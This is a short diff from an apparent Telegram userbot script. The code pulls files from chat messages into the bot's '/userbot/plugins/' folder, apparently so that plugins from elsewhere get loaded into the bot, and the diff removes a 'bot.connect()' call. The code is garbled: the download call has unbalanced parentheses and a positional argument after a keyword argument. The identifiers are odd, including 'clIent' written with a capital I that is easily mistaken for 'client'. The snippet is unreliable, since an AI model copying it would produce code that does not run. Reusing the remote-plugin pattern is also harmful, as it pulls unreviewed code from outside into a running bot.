@@ -52,8 +52,7 @@ async def a():
     for ixo in total_doxx:
         mxo = itzsjdude[ixo].id ; await client.download_file(await bot.get_messages(clIent, ids=mxo, "/userbot/plugins/")
 
-        bot.connect()
-        
+       
 bot.loop.run_until_complete(a())
 
 async def plug():
